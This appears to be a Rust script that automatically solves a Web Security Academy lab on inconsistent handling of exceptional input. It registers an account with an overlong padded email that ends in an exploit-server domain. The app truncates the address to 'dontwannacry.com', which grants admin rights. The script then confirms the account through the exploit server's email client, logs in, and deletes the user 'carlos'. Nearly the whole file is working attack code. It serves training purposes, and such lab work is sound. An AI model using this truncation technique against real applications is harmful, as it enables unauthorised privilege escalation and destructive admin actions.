/**********************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 27/10/2023
*
* Lab: Inconsistent handling of exceptional input
*
* Steps: 1. Fetch the register page
*        2. Extract csrf token and session cookie to register a new account
*        3. Register a new account Register a new account with a suitable offset
*           and dontwannacry.com before the real domain
*        4. Fetch the email client
*        5. Extract the link of account registration
*        6. Complete the account registration by following the link
*        7. Fetch the login page
*        8. Extract csrf token and session cookie to login
*        9. Login to the new account
*        10. Delete carlos from the admin panel
*
***********************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0afe004403a2287382181b0b00a20056.web-security-academy.net";

    // change this to your exploit domain
    let exploit_domain = "exploit-0a1f00f903b8282282371ad5011700e1.exploit-server.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{}", "⦗1⦘ Fetching the register page.. ".white());
    io::stdout().flush();

    // fetch the register page
    let register_page = client
        .get(format!("{url}/register"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the register page".red()
        ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗2⦘ Extracting csrf token and session cookie to register a new account.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_session_cookie(register_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract csrf token
    let mut csrf =
        extract_csrf(register_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));

    // the username of the new account
    // you can change this to what you want
    let username = "attacker";

    // the username of the new account
    // you can change this to what you want
    let password = "hacking";

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗3⦘ Registering a new account with a suitable offset and dontwannacry.com before the real domain.. "
            .white(),
    );
    io::stdout().flush();

    // the offset before the real email
    // you can change the "a" char to any other alphabetical char
    let offset = "a".repeat(238);

    // the email we want to set our account with
    let target_email = "dontwannacry.com";

    // the final email address
    let malicious_email = &format!("{offset}@{target_email}.{exploit_domain}");

    // register new account
    let register = client
        .post(format!("{url}/register"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", username),
            ("password", password),
            ("csrf", &csrf),
            ("email", &malicious_email),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to register new account".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗4⦘ Fetching the email client.. ".white(),);
    io::stdout().flush();

    // fetch the email client
    let email_client = client
        .get(format!("https://{exploit_domain}/email"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the email client".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗5⦘ Extracting the link of account registration.. ".white(),
    );
    io::stdout().flush();

    // get the body of the email client
    let body = email_client.text().unwrap();

    // extract the link of account registration
    let registration_link = capture_pattern(">(https.*)</a>", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the link of account registration".red()
    ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗6⦘ Completing the account registration by following the link.. ".white(),
    );
    io::stdout().flush();

    // complete the account registration
    client.get(registration_link).send().expect(&format!(
        "{}",
        "[!] Failed to complete the account registration".red()
    ));

    println!("{}", "OK".green());
    print!("{}", "⦗7⦘ Fetching the login page.. ".white(),);
    io::stdout().flush();

    // fetch login page
    let login_page = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗8⦘ Extracting csrf token and session cookie to login.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    session = extract_session_cookie(login_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract csrf token
    csrf = extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗9⦘ Logging in to the new account.. ".white());
    io::stdout().flush();

    // login to the new account
    let login = client
        .post(format!("{url}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", username),
            ("password", password),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to login to the new account".red()
        ));

    // extract session cookie of wiener
    session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗10⦘ Deleting carlos from the admin panel.. ".white(),);
    io::stdout().flush();

    // delete carlos
    client
        .get(format!("{url}/admin/delete?username=carlos"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to delete carlos from the admin panel".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
